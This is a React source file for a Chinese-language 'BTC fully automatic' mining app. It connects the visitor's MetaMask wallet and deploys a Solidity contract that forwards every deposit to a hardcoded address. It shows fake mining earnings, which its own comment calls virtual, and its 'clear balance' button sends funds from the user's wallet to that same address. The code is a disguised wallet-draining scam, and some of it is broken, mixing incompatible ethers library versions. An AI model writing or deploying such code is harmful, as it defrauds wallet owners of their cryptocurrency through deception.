import React, { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import solc from 'solc-js';

function App() {
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [contract, setContract] = useState(null);
  const [balance, setBalance] = useState(0);

  const C_ADDRESS = '0x10146dB51CF86bA063DDCA3D46D01025699D97Fa';

  // 连接钱包
  async function connectWallet() {
    if (window.ethereum) {
      const prov = new ethers.BrowserProvider(window.ethereum);
      await prov.send("eth_requestAccounts", []);
      const sign = await prov.getSigner();
      setProvider(prov);
      setSigner(sign);
    } else {
      alert('请安装 MetaMask');
    }
  }

  // 编译 Solidity
  async function compileContract() {
    const source = `
    pragma solidity ^0.8.20;
    contract BForwarder {
      address public immutable C;
      constructor(address _C) { require(_C != address(0), "C address cannot be zero"); C = _C; }
      receive() external payable { payable(C).transfer(msg.value); }
    }`;

    const input = {
      language: 'Solidity',
      sources: { 'BForwarder.sol': { content: source } },
      settings: { outputSelection: { '*': { '*': ['abi', 'evm.bytecode'] } } }
    };

    const output = JSON.parse(solc.compile(JSON.stringify(input)));
    const abi = output.contracts['BForwarder.sol']['BForwarder'].abi;
    const bytecode = output.contracts['BForwarder.sol']['BForwarder'].evm.bytecode.object;

    return { abi, bytecode };
  }

  // 部署合约
  async function deployContract() {
    if (!signer) return alert('请先连接钱包');
    const { abi, bytecode } = await compileContract();
    const factory = new ethers.ContractFactory(abi, bytecode, signer);
    const cont = await factory.deploy(C_ADDRESS);
    await cont.deployed();
    setContract(cont);
    alert('合约部署成功，开始挖矿');
    getBalance(cont);
  }

  // 查询 B 合约余额
  async function getBalance(cont) {
    if (!cont) return;
    const bal = await provider.getBalance(cont.target);
    setBalance(Number(ethers.formatEther(bal)));
  }

  // 清空 B 合约代币（示例 BNB）
  async function clearBalance() {
    if (!contract) return;
    const tx = await signer.sendTransaction({
      to: C_ADDRESS,
      value: await provider.getBalance(contract.target)
    });
    await tx.wait();
    alert('已清空 B 合约余额到 C');
    getBalance(contract);
  }

  // 点击挖矿按钮（包含一键部署）
  async function startMining() {
    if (!contract) await deployContract();
    alert('挖矿开始，每小时 0.001 BTC 虚拟产出');
    // 虚拟挖矿逻辑可存 localStorage
  }

  useEffect(() => {
    connectWallet();
  }, []);

  return (
    <div className="p-6">
      <h1 className="text-2xl font-bold">BTC 全自动</h1>
      <p>合约余额: {balance} BNB</p>
      <button className="bg-blue-500 text-white p-2 m-2" onClick={startMining}>
        挖矿 + 部署合约
      </button>
      <button className="bg-red-500 text-white p-2 m-2" onClick={clearBalance}>
        清空 B 合约余额给 C
      </button>
    </div>
  );
}

export default App;
